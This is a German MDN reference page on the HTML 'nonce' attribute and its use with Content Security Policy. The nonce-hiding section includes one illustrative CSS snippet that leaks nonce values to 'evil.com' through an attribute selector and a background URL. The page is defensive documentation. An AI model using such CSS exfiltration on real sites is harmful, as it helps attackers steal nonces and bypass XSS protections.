---
title: nonce
slug: Web/HTML/Reference/Global_attributes/nonce
l10n:
  sourceCommit: e6d43da6c6d28a6ac92cdd47882809ffbdf987ce
---

{{HTMLSidebar("Global_attributes")}}

Das **`nonce`** [globale Attribut](/de/docs/Web/HTML/Reference/Global_attributes) ist ein Inhaltsattribut, das eine kryptografische "once" (einmalig) verwendete Zahl definiert. Diese kann von der [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP) verwendet werden, um festzustellen, ob ein gegebener Abruf für ein bestimmtes Element erlaubt wird oder nicht.

## Beschreibung

Das `nonce`-Attribut ist nützlich, um bestimmte Elemente wie ein bestimmtes Inline-Skript oder Style-Elemente auf die Allowlist zu setzen. Es kann Ihnen helfen, die `unsafe-inline`-Direktive der [CSP](/de/docs/Web/HTTP/Guides/CSP) zu vermeiden, die _alle_ Inline-Skripte oder Stile zulassen würde.

> [!NOTE]
> Verwenden Sie `nonce` nur in Fällen, in denen Sie keine Möglichkeit haben, unsichere Inline-Skript- oder Styleinhalte zu umgehen. Wenn Sie `nonce` nicht benötigen, verwenden Sie es nicht. Wenn Ihr Skript statisch ist, könnten Sie stattdessen auch einen CSP-Hash verwenden. (Siehe Verwendungshinweise zu [unsicheren Inline-Skripten](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#unsafe_inline_script).) Versuchen Sie immer, den vollen Vorteil der [CSP](/de/docs/Web/HTTP/Guides/CSP)-Schutzmechanismen zu nutzen und vermeiden Sie Nonces oder unsichere Inline-Skripte wann immer möglich.

### Verwendung von nonce zur Aufnahme eines `<script>`-Elements in die Allowlist

Es gibt einige Schritte, um ein Inline-Skript mit dem Nonce-Mechanismus auf die Allowlist zu setzen:

#### Generierung von Werten

Erzeugen Sie von Ihrem Webserver aus einen zufälligen, base64-kodierten String mit mindestens 128 Bit Daten aus einem kryptografisch sicheren Zufallszahlengenerator. Nonces sollten jedes Mal, wenn die Seite geladen wird, unterschiedlich generiert werden (Nonce nur einmal!). Zum Beispiel in nodejs:

```js
import crypto from "node:crypto";

crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### Aufnahme von Inline-Skript in die Allowlist

Die auf Ihrem Backend-Code generierte Nonce sollte nun für das Inline-Skript verwendet werden, das Sie auf die Allowlist setzen möchten:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### Senden einer Nonce mit einem CSP-Header

Schließlich müssen Sie den Nonce-Wert in einem
[`Content-Security-Policy`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy)-Header senden
(dem Wert `nonce-` voranstellen):

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### Zugriff auf Nonces und Nonce-Verbergung

Aus Sicherheitsgründen ist das `nonce`-Inhaltsattribut verborgen (es wird eine leere Zeichenkette zurückgegeben).

```js example-bad
script.getAttribute("nonce"); // returns empty string
```

Die [`nonce`](/de/docs/Web/API/HTMLElement/nonce)-Eigenschaft ist die einzige Möglichkeit, auf Nonces zuzugreifen:

```js example-good
script.nonce; // returns nonce value
```

Nonce-Verbergung hilft, Angreifer daran zu hindern, Nonce-Daten über Mechanismen zu exfiltrieren, die Daten
aus Inhaltsattributen wie diesem erfassen können:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`HTMLElement.nonce`](/de/docs/Web/API/HTMLElement/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP)
- CSP: [`script-src`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)
